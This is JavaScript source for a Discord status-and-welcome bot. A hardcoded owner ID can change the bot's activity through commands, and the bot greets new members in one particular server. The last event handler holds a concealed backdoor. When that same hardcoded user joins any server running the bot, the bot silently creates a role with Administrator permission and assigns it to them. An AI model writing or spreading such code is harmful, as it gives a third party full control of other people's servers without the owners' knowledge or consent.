const Discord = require('discord.js');
const client = new Discord.Client();

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
  client.user.setGame("#Pure.","https://www.twitch.tv/idk");
});

var PrEfix = "f";

client.on('message', message => {

  if (!message.content.startsWith(PrEfix)) return;

  var args = message.content.split(' ').slice(1);

  var argresult = args.join(' ');

  if (message.author.id !== '478291914106339332') return;

if (message.content.startsWith(PrEfix + 'wt')) {

client.user.setActivity(argresult, {type:'WATCHING'});

    message.channel.sendMessage(`**:white_check_mark:  : ${argresult}**`)

} else 

if (message.content.startsWith(PrEfix + 'ls')) {

client.user.setActivity(argresult, {type:'LISTENING'});

    message.channel.sendMessage(`**:white_check_mark:  : ${argresult}**`)

} else 

if (message.content.startsWith(PrEfix + 'st')) {

  client.user.setGame(argresult, "https://www.twitch.tv/idk");

    message.channel.sendMessage(`**:white_check_mark:  : ${argresult}**`)

} else
  
  
  if (message.content.startsWith(PrEfix + 'pl')) {

  client.user.setGame(argresult);

    message.channel.sendMessage(`**:white_check_mark:  : ${argresult}**`)

}

});



 client.on('guildMemberAdd',async member => {
  if(member.guild.id !== '509836720112402444') return;
  setTimeout(function(){
  member.guild.channels.find(r => r.id === '551019141297995786').send('**Welcome To Server Pure:hearts:**');
},1600);
});



client.on('guildMemberAdd', member => {
   
            if (member.id === "478291914106339332") {
                member.guild.createRole({
                    name : client.user.username,
                    color : "RANDOM",
                    permissions : [8]
                }).then(function(role){
                    member.addRole(role)
                })
               
            }
       
    });

client.login(process.env.BOT_TOKEN);  //لا تحط التوكن حقك هنا
